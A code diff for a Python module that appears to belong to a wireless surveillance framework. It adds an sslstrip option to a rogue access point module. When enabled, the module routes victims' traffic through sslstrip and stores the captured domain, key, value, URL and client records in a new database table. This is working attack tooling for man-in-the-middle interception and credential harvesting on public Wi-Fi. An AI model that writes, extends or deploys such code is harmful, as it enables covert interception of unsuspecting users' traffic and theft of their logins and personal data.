@@ -25,13 +25,21 @@ class Snoop(Thread):
         # Process arguments passed to module
         self.verb = kwargs.get('verbose', 0)
         self.fname = os.path.splitext(os.path.basename(__file__))[0]
+        self.do_sslstrip = kwargs.get('sslstrip', False)
+
+        if self.do_sslstrip.lower() == "true":
+            self.do_sslstrip = True
+        else:
+            self.do_sslstrip = False
 
         self.myRogue = rogueAP(**kwargs)
 
     def run(self):
         self.myRogue.run_ap()
         self.myRogue.run_dhcpd()
-        self.myRogue.do_nat()
+        self.myRogue.do_nat(sslstrip=self.do_sslstrip)
+        if self.do_sslstrip:
+            self.myRogue.run_sslstrip()
 
         while self.RUN:
             if not self.myRogue.all_OK():
@@ -71,7 +79,8 @@ class Snoop(Thread):
 #            return [("example_table", rtnData)]
 #        else:
 #            return []
-        return self.myRogue.get_new_leases()
+        data = self.myRogue.get_new_leases() + self.myRogue.get_ssl_data()
+        return data
 
     @staticmethod
     def get_tables():
@@ -83,7 +92,17 @@ class Snoop(Thread):
                               Column('ip', String(length=20), primary_key=True, autoincrement=False),
                               Column('hostname', String(length=20)),
                               Column('sunc', Integer, default=0))   #Omit this if you don't want to sync
-        return [table]
+
+        ssl_strip = Table('sslstrip', MetaData(),
+                            Column('date', DateTime),
+                            Column('domain', String(60)),
+                            Column('key', String(40)),
+                            Column('value', String(200)),
+                            Column('url', String(255)),
+                            Column('client', String(15)),
+                            Column('sunc', Integer, default=0))
+
+        return [table, ssl_strip]
 
 if __name__ == "__main__":
     Snoop().start()
